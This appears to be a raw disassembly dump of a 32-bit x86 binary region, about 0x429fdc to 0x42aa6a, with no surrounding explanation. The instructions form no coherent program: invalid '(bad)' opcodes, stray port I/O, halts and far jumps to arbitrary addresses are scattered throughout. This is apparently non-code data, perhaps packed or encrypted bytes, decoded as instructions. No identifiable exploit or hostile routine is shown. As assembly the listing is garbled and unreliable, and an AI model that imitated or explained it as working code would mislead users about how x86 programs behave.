  429fdc:	arpl   WORD PTR [ebx+0x328ee18c],cx
  429fe2:	dec    eax
  429fe3:	push   ebx
  429fe4:	scas   eax,DWORD PTR es:[edi]
  429fe5:	and    DWORD PTR ds:0x63c9bd63,ebp
  429feb:	fistp  WORD PTR [edi]
  429fed:	adc    BYTE PTR [edi+ebp*8-0x1346bcc0],0xc0
  429ff5:	mov    dh,0x86
  429ff7:	dec    eax
  429ff8:	fsubr  DWORD PTR [edx+ebp*8+0x42]
  429ffc:	inc    esp
  429ffd:	and    ebx,DWORD PTR [esi]
  429fff:	fist   DWORD PTR [ebp+0x18]
  42a002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a003:	add    ecx,DWORD PTR ds:0x7bb5a1ab
  42a009:	scas   eax,DWORD PTR es:[edi]
  42a00a:	add    edi,DWORD PTR [edi]
  42a00c:	out    0x7a,al
  42a00e:	mov    esp,0xe1edef2b
  42a013:	adc    BYTE PTR [esi-0x107d6e4f],ah
  42a019:	shr    DWORD PTR [ecx+0x39],1
  42a01c:	and    al,0x27
  42a01e:	test   ah,ah
  42a020:	pop    esi
  42a021:	les    edi,FWORD PTR [ecx+0xfa80d10]
  42a027:	cmp    eax,0x27bf486d
  42a02c:	in     al,dx
  42a02d:	frndint 
  42a02f:	and    dh,BYTE PTR [ecx]
  42a031:	dec    edi
  42a032:	and    ah,BYTE PTR [esi+edx*1+0x358b04f]
  42a039:	fs popf 
  42a03b:	push   0x145ef710
  42a040:	arpl   WORD PTR [ecx-0x97d732],dx
  42a046:	xor    al,0xe5
  42a048:	in     eax,dx
  42a049:	int    0x73
  42a04b:	test   edx,esi
  42a04d:	cmp    eax,0x8da6a5df
  42a052:	sbb    al,0xb
  42a054:	dec    eax
  42a055:	std    
  42a056:	std    
  42a057:	hlt    
  42a058:	xchg   edi,eax
  42a059:	imul   esi,DWORD PTR [edi+0x5b],0xdd690abe
  42a060:	pop    edx
  42a061:	ret    
  42a062:	sbb    cl,dh
  42a064:	pusha  
  42a065:	xchg   esi,eax
  42a066:	mov    ah,BYTE PTR [esi+0x3c]
  42a069:	mov    ch,0x4
  42a06b:	xchg   esp,eax
  42a06c:	xor    DWORD PTR [edi+esi*1-0x38],ecx
  42a070:	fiadd  WORD PTR [ecx+0x37912d44]
  42a076:	cmp    bl,BYTE PTR ds:0x1e4d7d28
  42a07c:	aad    0x18
  42a07e:	push   0xbd0677f0
  42a083:	jle    0x42a086
  42a085:	pop    ebx
  42a086:	daa    
  42a087:	mov    ds:0x5f5e87c1,al
  42a08c:	fs dec DWORD PTR cs:[edx-0x18]
  42a091:	push   eax
  42a092:	mov    bh,BYTE PTR [edx-0x32]
  42a095:	nop
  42a096:	adc    bl,bh
  42a098:	xor    cl,BYTE PTR [eax]
  42a09a:	add    bl,BYTE PTR cs:[ebx-0x46]
  42a09e:	inc    esp
  42a09f:	ins    DWORD PTR es:[edi],dx
  42a0a0:	into   
  42a0a1:	adc    al,BYTE PTR [eax+0x33]
  42a0a4:	inc    esi
  42a0a5:	mov    edi,0x94108fcc
  42a0aa:	loope  0x42a0a5
  42a0ac:	cmova  eax,DWORD PTR [edi]
  42a0af:	or     esp,0xe0588d08
  42a0b5:	jbe    0x42a0d0
  42a0b7:	lock sahf 
  42a0b9:	sub    cl,BYTE PTR [ebp-0xa]
  42a0bc:	repnz mov al,gs:0x4532a0
	...
  42a133:	add    BYTE PTR [esi-0x79],dl
  42a136:	std    
  42a137:	test   ch,bh
  42a139:	(bad)  
  42a13a:	jg     0x42a113
  42a13c:	jbe    0x42a105
  42a13e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a13f:	(bad)  
  42a140:	(bad)  [edi-0x4147d887]
  42a146:	add    DWORD PTR [eax],eax
  42a148:	test   BYTE PTR [eax],0x0
  42a14b:	add    ah,al
  42a14d:	or     BYTE PTR [ecx*1+0x307b7798],0xfd
  42a155:	lods   al,BYTE PTR ds:[esi]
  42a156:	fucom  st(0)
  42a158:	mov    edx,0x5c5c3f88
  42a15d:	xchg   DWORD PTR [eax+ebx*1-0x17],eax
  42a161:	jnp    0x42a158
  42a163:	loop   0x42a13d
  42a165:	enter  0x2855,0x22
  42a169:	or     al,0xf4
  42a16b:	cld    
  42a16c:	rcl    BYTE PTR [edx],cl
  42a16e:	ds int 0x27
  42a171:	lods   al,BYTE PTR ds:[esi]
  42a172:	mov    ebx,0x6125f711
  42a177:	sub    ebx,esi
  42a179:	lods   al,BYTE PTR ds:[esi]
  42a17a:	mov    al,ds:0x5d38e22b
  42a17f:	xchg   ebx,eax
  42a180:	or     ebp,ebx
  42a182:	aad    0x84
  42a184:	rcl    edi,0x71
  42a187:	push   ebx
  42a188:	fst    QWORD PTR [esp+ebp*1-0x72]
  42a18c:	je     0x42a1f3
  42a18e:	fwait
  42a18f:	loopne 0x42a118
  42a191:	mov    ch,0x74
  42a193:	fstp   DWORD PTR [edi]
  42a195:	aam    0xe2
  42a197:	pop    ecx
  42a198:	sbb    DWORD PTR [ebx-0x58],esi
  42a19b:	into   
  42a19c:	sub    ebp,DWORD PTR [ebp-0x5a]
  42a19f:	adc    esi,edx
  42a1a1:	bound  ecx,QWORD PTR ds:0xe079163d
  42a1a7:	jbe    0x42a143
  42a1a9:	xlat   BYTE PTR ds:[ebx]
  42a1aa:	jns    0x42a213
  42a1ac:	neg    DWORD PTR [edi+0x639c5b2]
  42a1b2:	jo     0x42a148
  42a1b4:	ja     0x42a22c
  42a1b6:	fmul   DWORD PTR [ebx-0x6ac073ce]
  42a1bc:	ffreep st(5)
  42a1be:	imul   ebx,DWORD PTR [ecx-0x51],0x9769fb0
  42a1c5:	mov    cl,0x4e
  42a1c7:	in     eax,dx
  42a1c8:	or     BYTE PTR [esi+0x2beff4ab],0x36
  42a1cf:	adc    al,BYTE PTR [edx+0x569ec7d0]
  42a1d5:	lea    ecx,[ecx+0x7b]
  42a1d8:	mov    ch,0xc5
  42a1da:	adc    al,ah
  42a1dc:	iret   
  42a1dd:	jecxz  0x42a17f
  42a1df:	adc    BYTE PTR [edx-0x5726ffca],dh
  42a1e5:	mov    bh,0xbd
  42a1e7:	mov    ecx,0x42e4f4d2
  42a1ec:	inc    esi
  42a1ed:	or     DWORD PTR [esp],ecx
  42a1f0:	pop    ds
  42a1f1:	int    0x75
  42a1f3:	mov    edx,0x7efd96c5
  42a1f8:	and    ebp,ebx
  42a1fa:	arpl   WORD PTR [edx-0x6c426519],sp
  42a200:	jns    0x42a21a
  42a202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a203:	fprem  
  42a205:	dec    ebx
  42a206:	test   al,0xbd
  42a208:	jae    0x42a1e3
  42a20a:	jl     0x42a1de
  42a20c:	adc    esp,edx
  42a20e:	sub    eax,0x1db7ac03
  42a213:	lods   al,BYTE PTR ds:[esi]
  42a214:	dec    esi
  42a215:	push   edx
  42a216:	cld    
  42a217:	push   es
  42a218:	adc    BYTE PTR ds:0xaa79033a,0xdd
  42a21f:	add    ch,BYTE PTR [ecx]
  42a221:	aaa    
  42a222:	mov    cl,0xce
  42a224:	and    ah,dl
  42a226:	push   ebx
  42a227:	mov    bl,0x41
  42a229:	and    DWORD PTR [eax],eax
  42a22b:	dec    edx
  42a22c:	mov    dl,0x8a
  42a22e:	loope  0x42a214
  42a230:	cdq    
  42a231:	fsub   DWORD PTR [edx-0x50]
  42a234:	mov    BYTE PTR [edx+0x46],ch
  42a237:	test   DWORD PTR [esi-0x5e],ebp
  42a23a:	sbb    DWORD PTR [ebx],0x31
  42a23d:	jns    0x42a200
  42a23f:	sub    DWORD PTR [ebp+0x90],edx
	...
  42a2b1:	add    BYTE PTR [eax],al
  42a2b3:	add    al,dh
  42a2b5:	adc    al,0xe1
  42a2b7:	(bad)  
  42a2b8:	in     eax,0xff
  42a2ba:	call   FWORD PTR [esi]
  42a2bc:	xor    eax,0xde7f8ab9
  42a2c1:	and    ah,cl
  42a2c3:	call   0xf6:0x1bfae
  42a2ca:	add    BYTE PTR [eax],al
  42a2cc:	adc    BYTE PTR [edx-0x39],al
  42a2cf:	lahf   
  42a2d0:	or     BYTE PTR [eax],al
  42a2d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a2d3:	pop    ecx
  42a2d4:	and    eax,0x5d1fbd0b
  42a2d9:	pop    esp
  42a2da:	leave  
  42a2db:	cmp    al,0x40
  42a2dd:	scas   eax,DWORD PTR es:[edi]
  42a2de:	adc    al,ch
  42a2e0:	push   0xbf2ae36
  42a2e5:	mov    bh,BYTE PTR [esi-0x35]
  42a2e8:	mov    bl,0xe8
  42a2ea:	(bad)  
  42a2eb:	pop    esp
  42a2ec:	push   esi
  42a2ed:	or     al,0xeb
  42a2ef:	jbe    0x42a30c
  42a2f1:	add    al,0x93
  42a2f3:	sbb    dh,BYTE PTR [ebp+0x5e]
  42a2f6:	loope  0x42a30c
  42a2f8:	enter  0xf0de,0x6a
  42a2fc:	clc    
  42a2fd:	mov    esp,0x5fa58efc
  42a302:	xor    eax,0xd4b513ef
  42a307:	(bad)  
  42a308:	call   0x95356aaf
  42a30d:	xchg   esp,eax
  42a30e:	add    BYTE PTR [ebx-0x5],bh
  42a311:	push   edx
  42a312:	clc    
  42a313:	js     0x42a303
  42a315:	or     edx,eax
  42a317:	mov    ch,0x35
  42a319:	adc    al,0x59
  42a31b:	fwait
  42a31c:	mov    BYTE PTR ds:0x57a55976,0x4a
  42a323:	push   0xc7eac0e5
  42a328:	adc    eax,0x4145260
  42a32d:	sub    BYTE PTR [ebx-0x2594ca7c],al
  42a333:	xchg   ecx,eax
  42a334:	outs   dx,BYTE PTR ds:[esi]
  42a335:	jecxz  0x42a318
  42a337:	in     al,dx
  42a338:	pop    ss
  42a339:	jmp    0x923e:0xaf87a7e6
  42a340:	or     esi,DWORD PTR [esi]
  42a342:	fsubr  st,st(2)
  42a344:	repz call 0x81b26076
  42a34a:	jmp    0x2d2314a2
  42a34f:	cdq    
  42a350:	jb     0x42a375
  42a352:	int    0xe4
  42a354:	sbb    al,0x93
  42a356:	shl    BYTE PTR [eax+0x78ef8cca],0xb6
  42a35d:	jl     0x42a378
  42a35f:	je     0x42a350
  42a361:	cmp    DWORD PTR [eax-0x6e],edx
  42a364:	adc    BYTE PTR [edx+0x50368b43],bh
  42a36a:	fidivr WORD PTR [ebx-0x7b9126b4]
  42a370:	mov    ebx,0x24b969c8
  42a375:	(bad)  
  42a376:	in     eax,dx
  42a377:	sub    DWORD PTR [eax-0x2a02f825],ebp
  42a37d:	jg     0x42a301
  42a37f:	mov    edi,0x920b7e6f
  42a384:	sub    BYTE PTR [edx+0x14],al
  42a387:	cmp    eax,0xe0f7b021
  42a38c:	pusha  
  42a38d:	sub    al,0x47
  42a38f:	jl     0x42a313
  42a391:	pop    esi
  42a392:	rcr    BYTE PTR [esp+eax*1+0x35],0xf8
  42a397:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a398:	je     0x42a355
  42a39a:	mov    dh,0x42
  42a39c:	arpl   WORD PTR [esi-0x465c3066],ax
  42a3a2:	sub    eax,0xf9740b49
  42a3a7:	xchg   esi,eax
  42a3a8:	(bad)  
  42a3a9:	in     al,dx
  42a3aa:	pop    ebp
  42a3ab:	les    ecx,FWORD PTR [edx]
  42a3ad:	test   al,0xb3
  42a3af:	imul   ebp,DWORD PTR [ebx],0x8b74c8cd
  42a3b5:	pop    eax
  42a3b6:	jle    0x42a358
  42a3b8:	mov    ds:0xb626055a,al
  42a3bd:	and    al,0xad
  42a3bf:	jno    0x42a3b0
  42a3c1:	mov    bl,0x0
	...
  42a433:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  42a437:	sub    al,0x53
  42a439:	ds jg  0x42a4a9
  42a43c:	stos   BYTE PTR es:[edi],al
  42a43d:	dec    ebx
  42a43e:	push   edi
  42a43f:	jo     0x42a414
  42a441:	inc    edx
  42a442:	xchg   BYTE PTR [ecx-0x5c],ah
  42a445:	rol    BYTE PTR [ecx],0x0
  42a448:	test   BYTE PTR [eax],0x0
  42a44b:	add    bl,bh
  42a44d:	aaa    
  42a44e:	mov    dl,0xc4
  42a450:	mov    edi,ecx
  42a452:	inc    edi
  42a453:	hlt    
  42a454:	mov    ecx,0xbd765477
  42a459:	not    BYTE PTR [eax+0x2a0401e3]
  42a45f:	mov    edx,0x4a695bf
  42a464:	jno    0x42a483
  42a466:	xor    cl,BYTE PTR [ecx]
  42a468:	out    dx,al
  42a469:	mov    bl,0x20
  42a46b:	xor    edx,DWORD PTR ds:0xf68263c2
  42a471:	out    0x2d,al
  42a473:	push   edx
  42a474:	pop    DWORD PTR [eax+0x1ee04f5d]
  42a47a:	jae    0x42a4d1
  42a47c:	inc    ebx
  42a47d:	(bad)  
  42a47e:	repz popf 
  42a480:	push   es
  42a481:	push   edi
  42a482:	call   0x7d19:0xe4873a4d
  42a489:	in     al,dx
  42a48a:	mov    al,0xee
  42a48c:	loopne 0x42a4b1
  42a48e:	mov    ds:0x51fda403,al
  42a493:	xchg   ecx,eax
  42a494:	pop    ds
  42a495:	mov    al,ds:0x38f70e51
  42a49a:	sbb    eax,0xf45820b5
  42a49f:	mov    ch,0xf7
  42a4a1:	sub    DWORD PTR [esi+0x21],ebp
  42a4a4:	push   esi
  42a4a5:	test   eax,0x8edc4413
  42a4aa:	pop    eax
  42a4ab:	jle    0x42a510
  42a4ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a4ae:	fldcw  WORD PTR [edi-0x3a34ffb5]
  42a4b4:	(bad)  
  42a4b5:	dec    BYTE PTR [edx+0x69]
  42a4b8:	in     al,dx
  42a4b9:	mov    dh,0x42
  42a4bb:	cmp    al,0x2b
  42a4bd:	jecxz  0x42a4e5
  42a4bf:	jecxz  0x42a4b2
  42a4c1:	inc    ecx
  42a4c2:	adc    esp,DWORD PTR [ecx]
  42a4c4:	sbb    esi,DWORD PTR [esi-0x383b25b4]
  42a4ca:	sub    BYTE PTR [edx-0x11dc0a38],ah
  42a4d0:	and    BYTE PTR [ebp-0x28],0xe
  42a4d4:	pop    edx
  42a4d5:	out    dx,eax
  42a4d6:	ficom  DWORD PTR [ebx-0x147802d3]
  42a4dc:	ss lock inc eax
  42a4df:	cmp    esp,0xffffffb6
  42a4e2:	pop    ss
  42a4e3:	add    al,0xad
  42a4e5:	push   ecx
  42a4e6:	fsub   st,st(5)
  42a4e8:	adc    DWORD PTR [edx+0x51],0x18baa88b
  42a4ef:	mov    al,0x5
  42a4f1:	and    DWORD PTR gs:[eax+0x57672271],ecx
  42a4f8:	(bad)  
  42a4f9:	das    
  42a4fa:	and    ax,0x5d68
  42a4fe:	pop    ebp
  42a4ff:	mov    ebp,0x961312f3
  42a504:	pop    eax
  42a505:	jle    0x42a523
  42a507:	mov    dl,0x44
  42a509:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a50a:	adc    BYTE PTR [esp+eiz*2-0x6c],cl
  42a50e:	retf   0x2f7f
  42a511:	jl     0x42a50b
  42a513:	pop    ebx
  42a514:	dec    ebx
  42a515:	scas   eax,DWORD PTR es:[edi]
  42a516:	mul    BYTE PTR [ebx]
  42a518:	loopne 0x42a4b7
  42a51a:	dec    esi
  42a51b:	icebp  
  42a51c:	jne    0x42a507
  42a51e:	scas   eax,DWORD PTR es:[edi]
  42a51f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a520:	icebp  
  42a521:	nop
  42a522:	ret    0x5aa6
  42a525:	daa    
  42a526:	mov    ebp,0xabb8fab
  42a52b:	adc    bl,BYTE PTR [ecx+0x57cf8cc4]
  42a531:	pop    ds
  42a532:	sub    esi,DWORD PTR [edx-0x1eacc3c0]
  42a538:	lea    edi,[ebp-0x2e]
  42a53b:	and    eax,0x39b1473
  42a540:	int3   
  42a541:	push   esi
	...
  42a5b2:	add    BYTE PTR [eax],al
  42a5b4:	ins    DWORD PTR es:[edi],dx
  42a5b5:	sbb    eax,0xfbf6c0e6
  42a5ba:	outs   dx,DWORD PTR ds:[esi]
  42a5bb:	mov    ebp,0x44d94d2c
  42a5c0:	jg     0x42a62f
  42a5c2:	repz adc al,0x9a
  42a5c5:	rol    DWORD PTR [ecx],0x0
  42a5c8:	test   BYTE PTR [eax],0x0
  42a5cb:	add    BYTE PTR [eax-0x670881c3],dh
  42a5d1:	and    esp,ebx
  42a5d3:	ret    
  42a5d4:	cmp    esi,DWORD PTR [ebx+0x185c967b]
  42a5da:	jno    0x42a571
  42a5dc:	ret    0xa0d4
  42a5df:	mov    al,0x9d
  42a5e1:	add    dl,dl
  42a5e3:	dec    ebp
  42a5e4:	pop    ss
  42a5e5:	pop    eax
  42a5e6:	pusha  
  42a5e7:	push   ss
  42a5e8:	mov    ch,0xe0
  42a5ea:	inc    edi
  42a5eb:	mov    edi,DWORD PTR ds:0x2f471e7d
  42a5f1:	arpl   WORD PTR [edi+ecx*2],sp
  42a5f4:	sub    ebp,ebp
  42a5f6:	cli    
  42a5f7:	mul    DWORD PTR [edi-0x5]
  42a5fa:	push   esi
  42a5fb:	jge    0x42a58f
  42a5fd:	inc    ecx
  42a5fe:	cld    
  42a5ff:	adc    eax,0xc334d9a4
  42a604:	ret    0x972c
  42a607:	imul   edi,DWORD PTR [ecx],0xb24a46dc
  42a60d:	add    ah,bl
  42a60f:	aad    0x32
  42a611:	in     al,0xb2
  42a613:	pop    eax
  42a614:	pop    esi
  42a615:	loope  0x42a5c2
  42a617:	cmp    dl,BYTE PTR [ebx+0x72]
  42a61a:	nop
  42a61b:	dec    eax
  42a61c:	addr16 dec ebx
  42a61e:	cdq    
  42a61f:	inc    ebx
  42a620:	loopne 0x42a5ab
  42a622:	xchg   ecx,eax
  42a623:	push   0xe729c40f
  42a628:	inc    ecx
  42a629:	sbb    eax,0x9fb2130c
  42a62e:	popa   
  42a62f:	inc    esp
  42a630:	test   edx,eax
  42a632:	sub    ecx,DWORD PTR ds:0x7451b4c2
  42a638:	repnz sub BYTE PTR [esi],bh
  42a63b:	int3   
  42a63c:	repnz xchg esi,eax
  42a63e:	je     0x42a681
  42a640:	dec    edx
  42a641:	retf   
  42a642:	fisubr DWORD PTR [ecx+0x18]
  42a645:	pop    ss
  42a646:	and    ebx,DWORD PTR [ecx]
  42a648:	xor    eax,0x1d47eb36
  42a64d:	mov    DWORD PTR [ecx-0x10],edi
  42a650:	in     al,0x64
  42a652:	sub    DWORD PTR [edx+0x259f946],eax
  42a658:	aaa    
  42a659:	loop   0x42a6c3
  42a65b:	sahf   
  42a65c:	and    BYTE PTR [ecx],0x52
  42a65f:	pop    DWORD PTR [ecx-0x43bb34bc]
  42a665:	aad    0x9f
  42a667:	sub    DWORD PTR [ecx+ebx*8],edx
  42a66a:	mov    esi,0x61f6665a
  42a66f:	push   ecx
  42a670:	mov    bl,BYTE PTR [ebx+0x10976199]
  42a676:	sti    
  42a677:	push   ds
  42a678:	jp     0x42a6ad
  42a67a:	mov    dl,0x50
  42a67c:	push   ebx
  42a67d:	cdq    
  42a67e:	imul   edi,edx,0xffffff8e
  42a681:	fisttp QWORD PTR ds:0xc2f03edb
  42a687:	adc    eax,0xfe260c1c
  42a68c:	fidivr DWORD PTR [ebp-0x16db2355]
  42a692:	fsubr  st(1),st
  42a694:	fadd   st(6),st
  42a696:	das    
  42a697:	aaa    
  42a698:	mov    al,ds:0xd57c8c6a
  42a69d:	cld    
  42a69e:	rcl    DWORD PTR [ebp+0x4],cl
  42a6a1:	cli    
  42a6a2:	pop    ebx
  42a6a3:	push   ss
  42a6a4:	loop   0x42a718
  42a6a6:	aaa    
  42a6a7:	pop    ss
  42a6a8:	sub    BYTE PTR [edx+0x6],ch
  42a6ab:	and    edi,ecx
  42a6ad:	jmp    0x19b26fa0
  42a6b2:	mov    cl,0xf0
  42a6b4:	cwde   
  42a6b5:	(bad)  
  42a6b6:	imul   eax,esi,0x80c8845c
  42a6bc:	aas    
  42a6bd:	stos   DWORD PTR es:[edi],eax
  42a6be:	pop    esi
  42a6bf:	add    DWORD PTR [eax+0x77],0x0
	...
  42a733:	add    BYTE PTR [eax],dh
  42a735:	inc    edx
  42a736:	fbld   TBYTE PTR [edx-0x1]
  42a739:	(bad)  
  42a73a:	mov    ebp,0xffb84452
  42a73f:	cdq    
  42a740:	push   ebp
  42a741:	retf   0xe24f
  42a744:	nop
  42a745:	ret    0x1
  42a748:	test   BYTE PTR [eax],0x0
  42a74b:	add    BYTE PTR [ebx-0x1b],dh
  42a74e:	je     0x42a760
  42a750:	popf   
  42a751:	and    al,0xdc
  42a753:	in     eax,dx
  42a754:	not    ebp
  42a756:	xor    DWORD PTR [eax-0x48],ebp
  42a759:	and    al,0x6a
  42a75b:	popa   
  42a75c:	leave  
  42a75d:	retf   0x2904
  42a760:	push   ecx
  42a761:	sub    al,cl
  42a763:	scas   eax,DWORD PTR es:[edi]
  42a764:	nop
  42a765:	push   esp
  42a766:	mov    esi,0x58184437
  42a76b:	dec    esi
  42a76c:	sbb    al,0x43
  42a76e:	pop    esp
  42a76f:	clc    
  42a770:	lock cmp dl,BYTE PTR [eax+0x39]
  42a774:	pop    ebp
  42a775:	mov    dh,0x78
  42a777:	jnp    0x42a77b
  42a779:	je     0x42a76f
  42a77b:	and    esi,DWORD PTR [edx]
  42a77d:	mov    esp,0xb2084ada
  42a782:	loope  0x42a7b3
  42a784:	sahf   
  42a785:	arpl   ax,bx
  42a787:	int    0x8e
  42a789:	xchg   ebx,eax
  42a78a:	xchg   edx,eax
  42a78b:	ja     0x42a78f
  42a78d:	in     al,dx
  42a78e:	test   BYTE PTR [eax-0x3e],cl
  42a791:	jp     0x42a7ba
  42a793:	cdq    
  42a794:	retf   0xe418
  42a797:	and    BYTE PTR [esi-0x8c7923d],0x2c
  42a79e:	pop    ebp
  42a79f:	cli    
  42a7a0:	mov    dh,BYTE PTR [edx+0x78531ba7]
  42a7a6:	leave  
  42a7a7:	rcr    BYTE PTR [edx+0x34],cl
  42a7aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a7ab:	push   es
  42a7ac:	adc    ecx,DWORD PTR [ebx-0x1eb3da99]
  42a7b2:	sub    edi,DWORD PTR [eax-0x6d]
  42a7b5:	cmp    BYTE PTR [edx+0x11],ah
  42a7b8:	in     al,0x33
  42a7ba:	jmp    0xdecabe73
  42a7bf:	addr16 mov al,0x7a
  42a7c2:	ror    BYTE PTR [eax],cl
  42a7c4:	mov    ah,0x9b
  42a7c6:	jmp    0x57002c9a
  42a7cb:	sar    al,0xd9
  42a7ce:	cmp    al,0x60
  42a7d0:	dec    ebx
  42a7d1:	test   eax,0xa234cab5
  42a7d6:	iret   
  42a7d7:	hlt    
  42a7d8:	call   0x119eed27
  42a7dd:	mov    bl,0xae
  42a7df:	aas    
  42a7e0:	lahf   
  42a7e1:	test   al,0xee
  42a7e3:	jo     0x42a775
  42a7e5:	dec    ebp
  42a7e6:	cmp    eax,0x1fa83fca
  42a7eb:	addr16 int3 
  42a7ed:	pop    ds
  42a7ee:	call   0x1ed2cfd7
  42a7f3:	push   ebx
  42a7f4:	cdq    
  42a7f5:	lods   al,BYTE PTR ds:[esi]
  42a7f6:	xchg   ecx,eax
  42a7f7:	jecxz  0x42a817
  42a7f9:	pop    ds
  42a7fa:	lds    ebx,FWORD PTR [ecx]
  42a7fc:	or     esi,DWORD PTR [edx-0x6bbae2a5]
  42a802:	in     eax,0xc5
  42a804:	push   ds
  42a805:	jb     0x42a78b
  42a807:	push   ecx
  42a808:	shl    BYTE PTR [ebp-0x30bc74bb],1
  42a80e:	adc    al,BYTE PTR [esp+ebp*8-0x6e2e4cb0]
  42a815:	push   esp
  42a816:	outs   dx,DWORD PTR ds:[esi]
  42a817:	jno    0x42a893
  42a819:	jbe    0x42a873
  42a81b:	add    DWORD PTR [eax-0x5500ce25],edx
  42a821:	hlt    
  42a822:	sub    eax,DWORD PTR [ebx]
  42a824:	test   al,0x55
  42a826:	(bad)  
  42a827:	mov    dl,0x58
  42a829:	jmp    0xb2b4:0x41a7a02c
  42a830:	hlt    
  42a831:	sub    DWORD PTR [esi+0x75fa6fd1],0xdcfad6af
  42a83b:	mov    dh,0xb1
  42a83d:	out    dx,al
  42a83e:	mov    ah,0x53
  42a840:	jp     0x42a851
	...
  42a8b2:	add    BYTE PTR [eax],al
  42a8b4:	push   edi
  42a8b5:	push   0xdf7fdf64
  42a8ba:	(bad)  
  42a8bb:	call   0x123b0c10
  42a8c0:	cmp    ecx,0x4e
  42a8c3:	ja     0x42a84b
  42a8c5:	ret    
  42a8c6:	add    DWORD PTR [eax],eax
  42a8c8:	test   BYTE PTR [eax],0x0
  42a8cb:	add    BYTE PTR [edi],al
  42a8cd:	imul   eax,DWORD PTR [ebp+0xb],0x24b7f237
  42a8d4:	pushf  
  42a8d5:	sbb    dh,BYTE PTR [eax-0x1a]
  42a8d8:	dec    edi
  42a8d9:	in     eax,0xba
  42a8db:	rol    dl,0x59
  42a8de:	jne    0x42a879
  42a8e0:	jae    0x42a916
  42a8e2:	jbe    0x42a92f
  42a8e4:	ins    DWORD PTR es:[edi],dx
  42a8e5:	jle    0x42a8ae
  42a8e7:	add    edi,DWORD PTR [ebx+0x56c91ec]
  42a8ed:	jns    0x42a8c9
  42a8ef:	aaa    
  42a8f0:	push   edi
  42a8f1:	shl    DWORD PTR [esi+edi*2],cl
  42a8f4:	push   es
  42a8f5:	sbb    BYTE PTR [edx+0x69757e13],cl
  42a8fb:	in     al,dx
  42a8fc:	pusha  
  42a8fd:	xchg   DWORD PTR [esi],esp
  42a8ff:	idiv   ah
  42a901:	sub    al,0x53
  42a903:	mov    ds:0x73c493a1,al
  42a908:	clc    
  42a909:	mov    WORD PTR [ebp+0x7fbb8117],?
  42a90f:	in     eax,dx
  42a910:	sar    ebx,cl
  42a912:	leave  
  42a913:	(bad)
  42a916:	xchg   BYTE PTR [ecx-0x46e018fb],dl
  42a91c:	das    
  42a91d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a91e:	mov    cl,0xe2
  42a920:	sub    eax,0xeefd98c3
  42a925:	adc    al,0x15
  42a927:	or     bl,dl
  42a929:	xor    ch,BYTE PTR [ebp-0x3c38d207]
  42a92f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a930:	aaa    
  42a931:	std    
  42a932:	jns    0x42a8dd
  42a934:	xor    DWORD PTR [edx],edx
  42a936:	leave  
  42a937:	inc    esp
  42a938:	add    bh,dl
  42a93a:	sub    DWORD PTR [esi-0x2a652880],esp
  42a940:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a941:	sahf   
  42a942:	xor    DWORD PTR [edi+0x9],eax
  42a945:	and    al,BYTE PTR [ebx+0x4b4c02f5]
  42a94b:	inc    ebx
  42a94c:	adc    BYTE PTR [edx],bl
  42a94e:	ficom  DWORD PTR [edi-0x10651d35]
  42a954:	jl     0x42a912
  42a956:	mov    eax,ds:0xdd3f8cb
  42a95b:	ja     0x42a906
  42a95d:	cmp    eax,esp
  42a95f:	es es jns 0x42a91f
  42a963:	pop    ss
  42a964:	ds mov dh,0xe2
  42a967:	xor    DWORD PTR [ebp-0x243d94f6],ebx
  42a96d:	pop    es
  42a96e:	sub    al,0xcb
  42a970:	(bad)  
  42a971:	loopne 0x42a9cc
  42a973:	or     al,0x88
  42a975:	xor    ch,bh
  42a977:	stos   BYTE PTR es:[edi],al
  42a978:	mov    esi,0x8063238c
  42a97d:	lods   eax,DWORD PTR ds:[esi]
  42a97e:	addr16 cli 
  42a980:	xchg   edx,eax
  42a981:	je     0x42a9cc
  42a983:	jmp    0x42a99f
  42a985:	cmp    BYTE PTR [edi+edi*8-0x72e81dbc],0xb9
  42a98d:	mov    WORD PTR [ebx],fs
  42a98f:	dec    ebp
  42a990:	mov    ds:0x19433bed,eax
  42a995:	xor    ebx,DWORD PTR [ecx+0x23]
  42a998:	xchg   esi,eax
  42a999:	push   cs
  42a99a:	stos   DWORD PTR es:[edi],eax
  42a99b:	sbb    ah,BYTE PTR [ecx]
  42a99d:	sbb    ch,BYTE PTR [ecx+0x565a435d]
  42a9a3:	into   
  42a9a4:	fs in  eax,dx
  42a9a6:	lods   al,BYTE PTR ds:[esi]
  42a9a7:	push   ds
  42a9a8:	int3   
  42a9a9:	jp     0x42aa01
  42a9ab:	xchg   edi,edx
  42a9ad:	je     0x42a97f
  42a9af:	mov    BYTE PTR [esi+eiz*2+0x62],bl
  42a9b3:	icebp  
  42a9b4:	jb     0x42a9a6
  42a9b6:	jns    0x42a9d5
  42a9b8:	enter  0xcdb3,0xf6
  42a9bc:	pop    esp
  42a9bd:	gs loopne 0x42a971
  42a9c0:	sub    al,0x68
	...
  42aa32:	add    BYTE PTR [eax],al
  42aa34:	into   
  42aa35:	std    
  42aa36:	sti    
  42aa37:	leave  
  42aa38:	sti    
  42aa39:	iret   
  42aa3a:	(bad)  
  42aa3b:	(bad)  
  42aa3c:	jmp    FWORD PTR [edi+ebx*1-0x1c]
  42aa40:	stos   DWORD PTR es:[edi],eax
  42aa41:	(bad)  
  42aa42:	enter  0x7ce2,0xc4
  42aa46:	add    DWORD PTR [eax],eax
  42aa48:	test   BYTE PTR [eax],0x0
  42aa4b:	add    dh,dh
  42aa4d:	xchg   BYTE PTR [ebx],dl
  42aa4f:	dec    BYTE PTR [eax+0x9e2adc8]
  42aa55:	inc    ebp
  42aa56:	enter  0x84bd,0x7
  42aa5a:	(bad)
  42aa5e:	lea    esi,[edi-0x48d1bccd]
  42aa64:	in     al,0x73
  42aa66:	mov    ecx,ebp
  42aa68:	xlat   BYTE PTR ds:[ebx]
  42aa69:	(bad)  
  42aa6a:	cmp    dl,al
